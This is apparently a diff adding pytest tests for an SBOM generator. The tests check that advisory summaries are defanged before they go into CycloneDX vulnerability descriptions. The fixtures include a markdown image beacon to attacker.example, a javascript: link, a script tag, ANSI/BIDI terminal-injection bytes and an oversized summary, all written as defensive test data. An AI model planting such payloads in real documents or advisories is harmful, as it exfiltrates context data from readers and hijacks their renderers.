@@ -265,3 +265,65 @@ def test_deterministic_timestamp_when_supplied() -> None:
     fixed = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
     bom = build_bom(deps=[_dep()], generated_at=fixed)
     assert bom["metadata"]["timestamp"] == "2026-01-01T12:00:00Z"
+
+
+# ---------------------------------------------------------------------------
+# Advisory-text sanitisation in vulnerability.description
+# ---------------------------------------------------------------------------
+
+def _adv_with_summary(summary: str) -> Advisory:
+    return Advisory(
+        osv_id="GHSA-test",
+        aliases=["CVE-2099-9999"],
+        summary=summary,
+        details="",
+        affected=[AffectedRange(type="ECOSYSTEM",
+                                events=[{"introduced": "0"}, {"fixed": "5"}])],
+        severity=CVSSScore(
+            score=9.8,
+            vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            severity="critical",
+        ),
+        fixed_versions=["5.0.0"],
+        references=[],
+    )
+
+
+def test_vex_description_strips_autofetch_markup() -> None:
+    """CycloneDX consumers (Dependency-Track, OWASP CDX CLI) render
+    vulnerability.description as markdown — autofetch markup in OSV
+    summaries MUST be defanged before emission."""
+    d = _dep()
+    adv = _adv_with_summary(
+        "RCE in foo. ![exfil](https://attacker.example/p?ctx=) "
+        "[click](javascript:alert(1)) <script>x</script>"
+    )
+    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
+    bom = build_bom(deps=[d], vuln_findings=findings)
+    desc = bom["vulnerabilities"][0]["description"]
+    assert "RCE in foo." in desc
+    assert "![" not in desc
+    assert "javascript:" not in desc
+    assert "<script" not in desc
+
+
+def test_vex_description_escapes_terminal_injection() -> None:
+    """ANSI / BIDI bytes in the OSV summary must not survive into
+    SBOM output (`cat sbom.cdx.json` shouldn't be hijack-able)."""
+    d = _dep()
+    adv = _adv_with_summary("harmless\x1b[31mDANGER\x1b[0m ‮text")
+    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
+    bom = build_bom(deps=[d], vuln_findings=findings)
+    desc = bom["vulnerabilities"][0]["description"]
+    assert "\x1b[" not in desc
+    assert "‮" not in desc
+
+
+def test_vex_description_caps_long_summaries() -> None:
+    """Adversarial advisories with massive summaries are capped."""
+    d = _dep()
+    adv = _adv_with_summary("x" * 100_000)
+    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
+    bom = build_bom(deps=[d], vuln_findings=findings)
+    desc = bom["vulnerabilities"][0]["description"]
+    assert len(desc) <= 2000
